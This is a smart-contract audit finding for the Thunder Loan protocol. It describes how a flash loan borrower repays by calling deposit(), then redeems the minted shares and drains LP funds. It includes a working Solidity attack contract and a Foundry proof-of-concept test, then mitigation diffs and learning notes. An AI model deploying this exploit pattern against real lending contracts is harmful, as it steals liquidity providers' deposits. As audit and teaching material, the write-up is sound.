# H-03: Borrower can repay flash loan via `deposit()` and redeem the minted shares

## Summary

`flashloan()` only checks that the AssetToken vault balance increased by at least the fee by the end of the callback. A borrower can satisfy this check by calling `deposit(amount + fee)` during the callback, receiving AssetToken shares for the repayment, then redeeming those shares after the flash loan completes.

## Vulnerability Details

The intended flash loan flow is:

1. ThunderLoan sends `amount` underlying tokens to the receiver.
2. Receiver executes arbitrary logic.
3. Receiver repays `amount + fee`.
4. Existing LPs receive the fee through an increased exchange rate.

However, the repayment check is only a final balance comparison:

```solidity
s_currentlyFlashLoaning[token] = true;
assetToken.transferUnderlyingTo(receiverAddress, amount);

receiverAddress.functionCall(
    abi.encodeWithSignature(
        "executeOperation(address,uint256,uint256,address,bytes)",
        address(token),
        amount,
        fee,
        msg.sender,
        params
    )
);

uint256 endingBalance = token.balanceOf(address(assetToken));
if (endingBalance < startingBalance + fee) {
    revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
}
s_currentlyFlashLoaning[token] = false;
```

During the callback, `deposit()` is still callable for the same token. The borrower can approve and deposit `amount + fee`, making the vault balance satisfy the repayment check. But unlike `repay()`, `deposit()` mints AssetToken shares to the borrower.

After the flash loan returns, the borrower redeems those shares and withdraws the deposited tokens back from the pool.

## Impact

An attacker can pass the flash loan repayment check while receiving a redeemable claim against the pool. After redeeming, the AssetToken vault loses approximately the borrowed amount, reducing LP funds.

This is high impact because a borrower can turn flash loan repayment into a mint of withdrawable pool shares.

## Proof of Concept

An existing PoC was added in `2023-11-Thunder-Loan/test/unit/ThunderLoanFindingsPoC.t.sol`:

```solidity
contract DepositInsteadOfRepayReceiver {
    ThunderLoanUpgraded private immutable i_thunderLoan;

    constructor(address thunderLoan) {
        i_thunderLoan = ThunderLoanUpgraded(thunderLoan);
    }

    function attack(IERC20 token, uint256 amount) external {
        i_thunderLoan.flashloan(address(this), token, amount, "");

        AssetToken assetToken = i_thunderLoan.getAssetFromToken(token);
        i_thunderLoan.redeem(token, assetToken.balanceOf(address(this)));
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address,
        bytes calldata
    )
        external
        returns (bool)
    {
        IERC20(token).approve(address(i_thunderLoan), amount + fee);
        i_thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }
}
```

```solidity
function testBorrowerCanDepositInsteadOfRepayAndDrainPool() public {
    ThunderLoanUpgraded thunderLoan = _deployThunderLoanUpgraded();
    thunderLoan.setAllowedToken(tokenA, true);
    AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);

    address lp = address(1);
    uint256 depositAmount = 1000e18;
    uint256 borrowAmount = 100e18;
    uint256 fee = thunderLoan.getCalculatedFee(tokenA, borrowAmount);

    tokenA.mint(lp, depositAmount);
    vm.startPrank(lp);
    tokenA.approve(address(thunderLoan), depositAmount);
    thunderLoan.deposit(tokenA, depositAmount);
    vm.stopPrank();

    DepositInsteadOfRepayReceiver attacker = new DepositInsteadOfRepayReceiver(address(thunderLoan));
    tokenA.mint(address(attacker), fee);

    uint256 poolBefore = tokenA.balanceOf(address(assetToken));

    attacker.attack(tokenA, borrowAmount);

    uint256 poolAfter = tokenA.balanceOf(address(assetToken));
    assertLt(poolAfter, poolBefore);
}
```

This PoC uses `ThunderLoanUpgraded` to show the issue is independent from the separate `deposit()` fake-fee exchange rate bug in the original implementation.

## Recommended Mitigation

Prevent deposit and redeem for a token while it is actively in a flash loan:

```diff
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
+   require(!s_currentlyFlashLoaning[token], "cannot deposit during flashloan");
    ...
}
```

```diff
function redeem(IERC20 token, uint256 amountOfAssetToken) external revertIfZero(amountOfAssetToken) revertIfNotAllowedToken(token) {
+   require(!s_currentlyFlashLoaning[token], "cannot redeem during flashloan");
    ...
}
```

A stronger design is to track repayment through `repay()` and require the receiver to repay at least `amount + fee` through that function, rather than accepting any ending balance increase as repayment.

## Learning Notes

This finding shows that final balance checks are not always enough when the borrower can call other protocol functions during the callback. The protocol must distinguish repayment from deposits that mint claims.

Relevant concepts: flash loan callbacks, cross-function reentrancy, balance-check accounting, share minting.

## Analysis Disclosure

Guided independent review.
